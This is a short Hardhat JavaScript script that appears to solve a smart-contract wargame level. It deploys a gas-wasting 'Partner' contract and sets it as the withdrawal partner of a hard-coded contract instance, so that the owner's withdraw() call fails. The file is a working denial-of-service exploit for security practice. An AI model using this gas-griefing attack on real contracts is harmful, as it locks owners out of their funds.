const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x2Cab5d50891e78e700Ee97B3b276193FD3a91813'
const abi = [
    "function setWithdrawPartner(address _partner) public"
]

async function hack(contract, signer) {
    // The withdraw() function sends funds to the partner.
    // If we don't implement a receive function, the function will still work because calls don't throw errors when call doesn't work.
    // But if we can waste all the gas in the receive function, then the whole tx will fail.
    const Partner = await ethers.getContractFactory('Partner')
    const partner = await Partner.deploy()
    await partner.deployed()
    console.log(`Partner Contract Deployed To: ${partner.address}`)

    // Then we set our new wasteful contract to the withdrawal partner.
    const tx = await contract.setWithdrawPartner(partner.address)
    await tx.wait()
    console.log(`Withdraw Partner Set.`)
    console.log('The owner is now locked from withdrawing funds.')
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})